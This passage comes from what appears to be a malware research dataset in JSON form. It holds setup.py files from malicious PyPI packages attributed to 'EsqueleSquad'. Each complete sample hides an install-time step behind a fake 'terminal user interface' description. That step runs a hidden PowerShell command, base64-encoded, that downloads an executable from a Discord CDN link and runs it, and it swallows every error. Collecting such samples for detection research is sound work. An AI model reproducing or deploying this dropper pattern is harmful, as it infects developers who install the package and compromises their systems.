pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-cpupipgame-v6.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cpupipgame',\n    packages = ['modlib'],\n    version = '1.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-cvcrafturl-v4.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cvcrafturl',\n    packages = ['modlib'],\n    version = '7.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-edpushinfo-v2.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-edpushinfo',\n    packages = ['modlib'],\n    version = '4.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-grandnvidiagrand-v3.59",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-grandnvidiagrand',\n    packages = ['modlib'],\n    version = '6.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-hackedccencode-v5.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hackedccencode',\n    packages = ['modlib'],\n    version = '5.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-httpgrandpong-v10.18",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-httpgrandpong',\n    packages = ['modlib'],\n    version = '1.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-httphttpultra-v2.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-httphttpultra',\n    packages = ['modlib'],\n    version = '7.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-httprevisa-v10.50",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-httprevisa',\n    packages = ['modlib'],\n    version = '7.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-hydracontrolget-v9.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydracontrolget',\n    packages = ['modlib'],\n    version = '5.4',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-hydralgtbvm-v9.93",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydraLGTBvm',\n    packages = ['modlib'],\n    version = '1.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-hydrasupernvidia-v3.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydrasupernvidia',\n    packages = ['modlib'],\n    version = '7.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-infoliblgtb-v1.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-infolibLGTB',\n    packages = ['modlib'],\n    version = '2.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-intelcpusuper-v6.44",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intelcpusuper',\n    packages = ['modlib'],\n    version = '5.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-intverpyw-v8.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intverpyw',\n    packages = ['modlib'],\n    version = '10.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 